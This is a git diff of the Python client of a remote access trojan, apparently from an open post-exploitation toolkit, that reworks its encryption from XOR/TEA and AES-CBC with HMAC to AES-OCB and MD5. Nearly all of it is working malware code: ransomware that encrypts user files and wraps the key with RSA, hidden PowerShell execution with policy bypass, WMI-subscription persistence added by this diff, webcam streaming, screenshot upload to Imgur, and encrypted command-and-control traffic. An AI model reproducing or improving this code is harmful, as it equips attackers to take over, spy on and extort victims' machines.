@@ -48,7 +48,6 @@ a8P     88 a8"    `Y88 a8"    `Y88 88P'    "8a 88 ""     `Y8 88P'   `"8a MM88MMM
 for pkg in '''
 import os
 import sys
-import imp
 import mss
 import cv2
 import wmi
@@ -69,6 +68,7 @@ import urllib
 import twilio
 import pyHook
 import pyxhook
+import hashlib
 import urllib2
 import marshal
 import zipfile
@@ -81,9 +81,7 @@ import cStringIO
 import subprocess
 import collections
 import Crypto.Util
-import Crypto.Hash.HMAC
 import Crypto.Cipher.AES
-import Crypto.Hash.SHA256
 import Crypto.PublicKey.RSA
 import Crypto.Cipher.PKCS1_OAEP
 
@@ -108,28 +106,28 @@ def config(*arg, **options):
 
 
 class ClientPayload(object):
-
-    __name__ = 'ClientPayload'
-    _abort   = False
+    
     _debug   = True
-    _config  = collections.OrderedDict()
+    _abort   = False
+    __name__ = 'ClientPayload'
     _tasks   = Queue.Queue()
     _lock    = threading.Lock()
+    _config  = collections.OrderedDict()
 
     def __init__(self, *args, **kwargs):
         self._workers = collections.OrderedDict()
         self._results = collections.OrderedDict()
         self._network = collections.OrderedDict()
         self._session = collections.OrderedDict()
-        self._sysinfo = self._get_sysinfo()
-        self._command = self._get_command()
+        self._sysinfo = self._get_system_info()
+        self._command = self._get_commands()
         self._startup = self._get_startup()
 
 
     @staticmethod
     def _get_id():
         try:
-            return Crypto.Hash.SHA256.new(ClientPayload._get_public_ip() + ClientPayload._get_mac_address()).hexdigest()
+            return hashlib.new('md5', ClientPayload._get_public_ip() + ClientPayload._get_mac_address()).hexdigest()
         except Exception as e:
             ClientPayload.debug("{} error: {}".format(ClientPayload._get_id.func_name, str(e)))
 
@@ -331,7 +329,9 @@ class ClientPayload(object):
     @staticmethod
     def _get_server_addr():
         try:
-            if not ClientPayload._debug:
+            if ClientPayload._debug:
+                return socket.gethostbyname(socket.gethostname())
+            else:
                 req = urllib2.Request(ClientPayload._config['api']['server']['endpoint'])
                 req.headers = {'API-Key': ClientPayload._config['api']['server']['api_key']}
                 res = json.loads(urllib2.urlopen(req).read())
@@ -342,7 +342,7 @@ class ClientPayload(object):
                     ClientPayload.debug("{} returned invalid IPv4 address: '{}'".format(ClientPayload._get_server_addr.func_name, str(ip)))
         except Exception as e:
             ClientPayload.debug("{} error: {}".format(ClientPayload._get_server_addr.func_name, str(e)))
-        return '127.0.0.1'
+        
 
 
     @staticmethod
@@ -365,112 +365,24 @@ class ClientPayload(object):
         except Exception as e:
             ClientPayload.debug("{} error: {}".format(ClientPayload._get_emails_as_json.func_name, str(e)))
 
-
     @staticmethod
-    def _get_encryption():
+    def _encrypt_aes(data, key):
         try:
-            return 'aes' if 'Crypto' in globals() else 'xor'
-        except Exception as e:
-            ClientPayload.debug("{} error: {}".format(ClientPayload._get_encryption.func_name, str(e)))
-
-
-    @staticmethod
-    def _get_padded(s, block_size, padding=chr(0)):
-        try:
-            return bytes(s) + (int(block_size) - len(bytes(s)) % int(block_size)) * bytes(padding)
-        except Exception as e:
-            ClientPayload.debug("{} error: {}".format(ClientPayload._get_padded.func_name, str(e)))
-
-
-    @staticmethod
-    def _get_blocks(s, block_size):
-        try:
-            return [s[i * block_size:((i + 1) * block_size)] for i in range(len(s) // block_size)]
-        except Exception as e:
-            ClientPayload.debug("{} error: {}".format(ClientPayload._get_blocks.func_name, str(e)))
-
-
-    @staticmethod
-    def _get_xor(s, t):
-        try:
-            return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(s, t))
-        except Exception as e:
-            ClientPayload.debug("{} error: {}".format(ClientPayload._get_xor.func_name, str(e)))
-
-
-    @staticmethod
-    @config(block_size=8, key_size=16, num_rounds=32)
-    def _encrypt_xor(data, key):
-        try:
-            data    = ClientPayload._get_padded(data, ClientPayload._encrypt_xor.block_size)
-            blocks  = ClientPayload._get_blocks(data, ClientPayload._encrypt_xor.block_size)
-            vector  = os.urandom(8)
-            result  = [vector]
-            for block in blocks:
-                block   = ClientPayload._get_xor(vector, block)
-                v0, v1  = struct.unpack("!2L", block)
-                k       = struct.unpack("!4L", key[:ClientPayload._encrypt_xor.key_size])
-                sum, delta, mask = 0L, 0x9e3779b9L, 0xffffffffL
-                for round in range(ClientPayload._encrypt_xor.num_rounds):
-                    v0  = (v0 + (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
-                    sum = (sum + delta) & mask
-                    v1  = (v1 + (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
-                output  = vector = struct.pack("!2L", v0, v1)
-                result.append(output)
-            return base64.b64encode(b"".join(result))
-        except Exception as e:
-            ClientPayload.debug("{} error: {}".format(ClientPayload._encrypt_xor.func_name, str(e)))
-
-
-    @staticmethod
-    @config(block_size=8, key_size=16, num_rounds=32)
-    def _decrypt_xor(data, key):
-        try:
-            data    = base64.b64decode(data)
-            blocks  = ClientPayload._get_blocks(data, ClientPayload._decrypt_xor.block_size)
-            vector  = blocks[0]
-            result  = []
-            for block in blocks[1:]:
-                v0, v1 = struct.unpack("!2L", block)
-                k = struct.unpack("!4L", key[:ClientPayload._decrypt_xor.key_size])
-                delta, mask = 0x9e3779b9L, 0xffffffffL
-                sum = (delta * ClientPayload._decrypt_xor.num_rounds) & mask
-                for round in range(ClientPayload._decrypt_xor.num_rounds):
-                    v1 = (v1 - (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
-                    sum = (sum - delta) & mask
-                    v0 = (v0 - (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
-                decode = struct.pack("!2L", v0, v1)
-                output = ClientPayload._get_xor(vector, decode)
-                vector = block
-                result.append(output)
-            return str().join(result).rstrip(chr(0))
-        except Exception as e:
-            ClientPayload.debug("{} error: {}".format(ClientPayload._decrypt_xor.func_name, str(e)))
-
-
-    @staticmethod
-    def _encrypt_aes(plaintext, key):
-        try:
-            text        = ClientPayload._get_padded(plaintext, Crypto.Cipher.AES.block_size)
-            iv          = os.urandom(Crypto.Cipher.AES.block_size)
-            cipher      = Crypto.Cipher.AES.new(key[:max(Crypto.Cipher.AES.key_size)], Crypto.Cipher.AES.MODE_CBC, iv)
-            ciphertext  = iv + cipher.encrypt(text)
-            hmac_sha256 = Crypto.Hash.HMAC.new(key[max(Crypto.Cipher.AES.key_size):], msg=ciphertext, digestmod=Crypto.Hash.SHA256).digest()
-            return base64.b64encode(ciphertext + hmac_sha256)
+            cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB)
+            ciphertext, tag = cipher.encrypt_and_digest(data)
+            output = b''.join((cipher.nonce, tag, ciphertext))
+            return base64.b64encode(output)
         except Exception as e:
             ClientPayload.debug("{} error: {}".format(ClientPayload._encrypt_aes.func_name, str(e)))
 
 
     @staticmethod
-    def _decrypt_aes(ciphertext, key):
+    def _decrypt_aes(data, key):
         try:
-            ciphertext  = base64.b64decode(ciphertext)
-            iv          = ciphertext[:Crypto.Cipher.AES.block_size]
-            cipher      = Crypto.Cipher.AES.new(key[:max(Crypto.Cipher.AES.key_size)], Crypto.Cipher.AES.MODE_CBC, iv)
-            read_hmac   = ciphertext[-Crypto.Hash.SHA256.digest_size:]
-            calc_hmac   = Crypto.Hash.HMAC.new(key[max(Crypto.Cipher.AES.key_size):], msg=ciphertext[:-Crypto.Hash.SHA256.digest_size], digestmod=Crypto.Hash.SHA256).digest()
-            ClientPayload.debug('HMAC-SHA256 hash authentication check failed - transmission may have been compromised') if calc_hmac != read_hmac else None
-            return cipher.decrypt(ciphertext[Crypto.Cipher.AES.block_size:-Crypto.Hash.SHA256.digest_size]).rstrip(chr(0))
+            data = cStringIO.StringIO(base64.b64decode(data))
+            nonce, tag, ciphertext = [ data.read(x) for x in (Crypto.Cipher.AES.block_size - 1, Crypto.Cipher.AES.block_size, -1) ]
+            cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB, nonce)
+            return cipher.decrypt_and_verify(ciphertext, tag)
         except Exception as e:
             ClientPayload.debug("{} error: {}".format(ClientPayload._decrypt_aes.func_name, str(e)))
 
@@ -480,7 +392,6 @@ class ClientPayload(object):
         try:
             if not ClientPayload._config['api'].get('imgur'):
                 return "No Imgur API Key found"
-            
             data = ClientPayload._get_normalized_data(source)
             post = ClientPayload._get_post_request('https://api.imgur.com/3/upload', headers={'Authorization': ClientPayload._config['api']['imgur']['api_key']}, data={'image': base64.b64encode(data), 'type': 'base64'})
             return str(json.loads(post)['data']['link'])
@@ -566,7 +477,7 @@ class ClientPayload(object):
     def _ransom_encrypt(self, path):
         try:
             if os.path.splitext(path)[1] in ['.pdf','.zip','.ppt','.doc','.docx','.rtf','.jpg','.jpeg','.png','.img','.gif','.mp3','.mp4','.mpeg','.mov','.avi','.wmv','.rtf','.txt','.html','.php','.js','.css','.odt', '.ods', '.odp', '.odm', '.odc', '.odb', '.doc', '.docx', '.docm', '.wps', '.xls', '.xlsx', '.xlsm', '.xlsb', '.xlk', '.ppt', '.pptx', '.pptm', '.mdb', '.accdb', '.pst', '.dwg', '.dxf', '.dxg', '.wpd', '.rtf', '.wb2', '.mdf', '.dbf', '.psd', '.pdd', '.pdf', '.eps', '.ai', '.indd', '.cdr', '.jpg', '.jpe', '.jpg', '.dng', '.3fr', '.arw', '.srf', '.sr2', '.bay', '.crw', '.cr2', '.dcr', '.kdc', '.erf', '.mef', '.mrw', '.nef', '.nrw', '.orf', '.raf', '.raw', '.rwl', '.rw2', '.r3d', '.ptx', '.pef', '.srw', '.x3f', '.der', '.cer', '.crt', '.pem', '.pfx', '.p12', '.p7b', '.p7c','.tmp','.py','.php','.html','.css','.js','.rb','.xml']:
-                aes_key = Crypto.Hash.SHA256.new(os.urandom(16)).hexdigest()
+                aes_key = os.urandom(16).encode('hex')
                 ransom  = self._encrypt_file(path, key=aes_key)
                 cipher  = Crypto.Cipher.PKCS1_OAEP.new(self._session['public_key'])
                 key     = base64.b64encode(cipher.encrypt(aes_key))
@@ -876,7 +787,7 @@ class ClientPayload(object):
 
     def _webcam_stream(self, port=None, retries=5):
         try:
-            if not port:
+            if not port or not str(port).isdigit():
                 return self.webcam.usage
             host = self._session['socket'].getpeername()[0]
             port = int(port)
@@ -1196,7 +1107,7 @@ class ClientPayload(object):
                 cmd_line = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(base64.b64encode(bytes(command).encode('UTF-16LE')))
             if len(cmd_line):
                 startup = "'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
-                powershell = self._get_remote_resource(self._config['resources']['powershell']).replace('[STARTUP]', startup).replace('[COMMAND_LINE]', cmd_line).replace('[NAME]', task_name)
+                powershell = self._config['resources']['powershell'].replace('[STARTUP]', startup).replace('[COMMAND_LINE]', cmd_line).replace('[NAME]', task_name)
                 self._get_powershell_exec(powershell)                
                 code = "Get-WmiObject __eventFilter -namespace root\\subscription -filter \"name='%s'\"" % task_name
                 result = self._get_powershell_exec(code)
@@ -1464,7 +1375,7 @@ class ClientPayload(object):
                 txt = buf[:48000]
                 nxt = buf[48000:]
                 kwargs.update({'result': txt})
-                self._session['socket'].send(self._encrypt_data(json.dumps(kwargs)) + '\n')
+                self._session['socket'].send(self._encrypt_aes(json.dumps(kwargs), self._session['key']) + '\n')
                 if nxt:
                     kwargs.update({'result': nxt})
                     self._server_send(**kwargs)
@@ -1481,7 +1392,7 @@ class ClientPayload(object):
                 break
         if data and len(bytes(data)):
             try:
-                text = self._decrypt_data(bytes(data).rstrip())
+                text = self._decrypt_aes(data.rstrip(), self._session['key'])
                 task = json.loads(text)
                 return task
             except Exception as e2:
@@ -1518,7 +1429,7 @@ class ClientPayload(object):
     def _session_id(self):
         try:
             if self._session['connection'].wait(timeout=3.0):
-                self._session['socket'].sendall(self._encrypt_data(json.dumps(self._sysinfo)) + '\n')
+                self._session['socket'].sendall(self._encrypt_aes(json.dumps(self._sysinfo), self._session['key']) + '\n')
                 buf      = ""
                 attempts = 1
                 while '\n' not in buf:
@@ -1531,16 +1442,14 @@ class ClientPayload(object):
                             continue
                         else:
                             break
-                if buf and len(bytes(buf)):
-                    session_id = self._decrypt_data(buf.rstrip()).strip().rstrip()
-                    if len(str(session_id)) == Crypto.Hash.SHA256.block_size:
-                        self.debug("Session ID: {}".format(session_id))
-                        return session_id
+                if buf:
+                    self._session['id'] = self._decrypt_aes(buf.rstrip(), self._session['key']).strip().rstrip()
+                    return self._session['id']
             else:
                 self.debug("{} timed out".format(self._session_id.func_name))
         except Exception as e:
             self.debug("{} error: {}".format(self._session_id.func_name, str(e)))
-        self.debug("Invalid Session ID: {}\nRestarting in 5 seconds...".format(bytes(session_id)))
+        self.debug("Restarting in 5 seconds...")
         self.kill()
         time.sleep(5)
         return self.run()
@@ -1556,7 +1465,7 @@ class ClientPayload(object):
                 self._session['socket'].send(Crypto.Util.number.long_to_bytes(xA))
                 xB = Crypto.Util.number.bytes_to_long(self._session['socket'].recv(256))
                 x  = pow(xB, a, p)
-                return Crypto.Hash.SHA256.new(Crypto.Util.number.long_to_bytes(x)).hexdigest()
+                return hashlib.new('md5', Crypto.Util.number.long_to_bytes(x)).hexdigest()
             else:
                 self.debug("{} timed out".format(self._session_key.func_name))
         except Exception as e:
@@ -1568,7 +1477,7 @@ class ClientPayload(object):
 
     def _task_id(self, task):
         try:
-            return Crypto.Hash.SHA256.new(self._sysinfo['id'] + str(task) + str(time.time())).hexdigest()
+            return hashlib.new('md5', self._sysinfo['id'] + str(task) + str(time.time())).hexdigest()
         except Exception as e:
             self.debug("{} error: {}".format(self._task_id.func_name, str(e)))
 
@@ -1613,55 +1522,41 @@ class ClientPayload(object):
             self.debug('{} error: {}'.format('TaskManager', str(e)))
 
 
-    def _decrypt_data(self, data, key=None):
-        try:
-            if not key:
-                key = self._session['key']
-            return getattr(self, '_decrypt_{}'.format(self._sysinfo['encryption']))(data, key)
-        except Exception as e:
-            self.debug('{} error: {}'.format(self._decrypt_data.func_name, str(e)))
-
-
     def _decrypt_file(self, filepath, key=None):
-        if os.path.isfile(filepath):
-            try:
+        try:
+            if os.path.isfile(filepath):
+                if not key:
+                    key = self._session['key']
                 with open(filepath, 'rb') as fp:
                     ciphertext = fp.read()
-                plaintext = self._decrypt_data(ciphertext) if not key else self._decrypt_data(ciphertext, key)
+                plaintext = self._decrypt_aes(ciphertext, key)
                 with open(filepath, 'wb') as fd:
                     fd.write(plaintext)
                 return filepath
-            except Exception as e1:
-                self.debug("{} error: {}".format(self._decrypt_file.func_name, str(e1)))
-        else:
-            return "File '{}' not found".format(filepath)
+            else:
+                return "File '{}' not found".format(filepath)
+        except Exception as e:
+            return "{} error: {}".format(self._decrypt_file.func_name, str(e))
                                 
 
-    def _encrypt_data(self, data, key=None):
-        try:
-            if not key:
-                key = self._session['key']
-            return getattr(self, '_encrypt_{}'.format(self._sysinfo['encryption']))(data, key)
-        except Exception as e:
-            self.debug('{} error: {}'.format(self._encrypt_data.func_name, str(e)))
-
-
     def _encrypt_file(self, filepath, key=None):
-        if os.path.isfile(filepath):
-            try:
+        try:
+            if os.path.isfile(filepath):
+                if not key:
+                    key = self._session['key']
                 with open(filepath, 'rb') as fp:
                     plaintext = fp.read()
-                ciphertext = self._encrypt_data(plaintext, key) if key else self._encrypt_data(plaintext)
+                ciphertext = self._encrypt_aes(plaintext, key)
                 with open(filepath, 'wb') as fd:
                     fd.write(ciphertext)
                 return filepath
-            except Exception as e:
-                self.debug("{} error: {}".format(self._encrypt_file.func_name, str(e)))
-        else:
-            return "File '{}' not found".format(filepath)
+            else:
+                return "File '{}' not found".format(filepath)
+        except Exception as e:
+            return "{} error: {}".format(self._encrypt_file.func_name, str(e))
 
 
-    def _get_powershell_exec(code):
+    def _get_powershell_exec(self, code):
         try:
             return self.execute('C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(base64.b64encode(code)))
         except Exception as e:
@@ -1682,26 +1577,26 @@ class ClientPayload(object):
             self.debug("{} error: {}".format(self._get_startup.func_name, str(e1)))
   
 
-    def _get_command(self):
+    def _get_commands(self):
         commands = {}
         for cmd in vars(ClientPayload):
             if hasattr(vars(ClientPayload)[cmd], 'command'):
                 try:
                     commands[cmd] = {'method': getattr(self, cmd), 'platforms': getattr(ClientPayload, cmd).platforms, 'usage': getattr(ClientPayload, cmd).usage, 'description': getattr(ClientPayload, cmd).func_doc.strip().rstrip()}
                 except Exception as e:
-                    ClientPayload.debug("{} error: {}".format(self._get_command.func_name, str(e)))
+                    ClientPayload.debug("{} error: {}".format(self._get_commands.func_name, str(e)))
         return commands
 
 
-    def _get_sysinfo(self):
+    def _get_system_info(self):
         info = {}
-        for key in ['id', 'public_ip', 'private_ip', 'platform', 'mac_address', 'architecture', 'username', 'administrator', 'device', 'encryption']:
+        for key in ['id', 'public_ip', 'private_ip', 'platform', 'mac_address', 'architecture', 'username', 'administrator', 'device']:
             value = '_get_%s' % key
             if hasattr(ClientPayload, value):
                 try:
                     info[key] = getattr(ClientPayload, value)()
                 except Exception as e:
-                    self.debug("{} error: {}".format(self._get_sysinfo.func_name, str(e)))
+                    self.debug("{} error: {}".format(self._get_system_info.func_name, str(e)))
         return info
 
 
@@ -1727,11 +1622,11 @@ class ClientPayload(object):
             return '{} error: {}'.format(self._get_standby_mode.func_name, str(e))
 
 
-    def _get_public_key(self):
+    def _get_public_key(self, *args, **kwargs):
         raw_buffer  = ""
         try:
-            attempt     = 1
-            self._session['socket'].sendall(self._encrypt_data(json.dumps({"request":"public_key"})) + '\n')
+            attempt = 1
+            self._session['socket'].sendall(self._encrypt_aes(json.dumps({"request":"public_key"}), self._session['key']) + '\n')
             while "\n" not in raw_buffer:
                 try:
                     raw_buffer += self._session['socket'].recv(1024)
@@ -1742,8 +1637,8 @@ class ClientPayload(object):
                         continue
                     else:
                         break
-            if raw_buffer and len(str(raw_buffer)):
-                key = self._decrypt_data(str(raw_buffer))
+            if raw_buffer:
+                key = self._decrypt_aes(raw_buffer, self._session['key'])
                 rsa = Crypto.PublicKey.RSA.importKey(key)
                 return rsa
         except Exception as e:
@@ -2320,7 +2215,7 @@ class ClientPayload(object):
             self.debug("{} error: '{}'".format(self.screenshot.func_name, str(e)))
 
 
-    @config(platforms=['win32','linux2','darwin'], methods={method: {'established': bool(), 'result': bytes()} for method in ['payload_dropper','hidden_file','scheduled_task','registry_key','startup_file','launch_agent','crontab_job']}, command=True, usage='persistence <add/remove> [method]')
+    @config(platforms=['win32','linux2','darwin'], methods={method: {'established': bool(), 'result': bytes()} for method in ['payload_dropper','hidden_file','scheduled_task','registry_key','startup_file','launch_agent','crontab_job','wmi_object']}, command=True, usage='persistence <add/remove> [method]')
     def persistence(self, args=None):
         """
         establish persistence to survive reboots
@@ -2497,19 +2392,10 @@ class ClientPayload(object):
             time.sleep(5)
             return self.run()
 
-
-
-
 def main(*args, **kwargs):
     ClientPayload._config.update({'api': {}, 'tasks': {}, 'resources': {}})
-#    if 'w' in kwargs or 'x' in kwargs:
-#        exec "import os, sys, urllib" in globals()
-#        imports = kwargs.get('w' if os.name is 'nt' else 'x')
-#        imports = ClientPayload._get_remote_resource(imports)
-#        for package in imports.splitlines():
-#            try:
-#                exec package in globals()
-#            except ImportError: pass
+    if '--debug' in sys.argv or 'debug' in sys.argv:
+        ClientPayload._debug = True
     if 'b' in kwargs:
         b   =  kwargs.get('b')
         api_endpoint, api_key = ClientPayload._get_remote_resource(b).splitlines()
@@ -2555,8 +2441,7 @@ def main(*args, **kwargs):
         v = kwargs.get('v')
         tasks = ClientPayload._get_remote_resource(v).splitlines()
         ClientPayload._config['tasks'] = tasks
-    dbg = '--debug' in sys.argv
-    payload = ClientPayload(debug=dbg)
+    payload = ClientPayload()
     #payload.run()
     return payload
 
@@ -2583,3 +2468,4 @@ if __name__ == '__main__':
   "w": "77888090548015223857",
   "z": "79892739118577505130"
 })
+
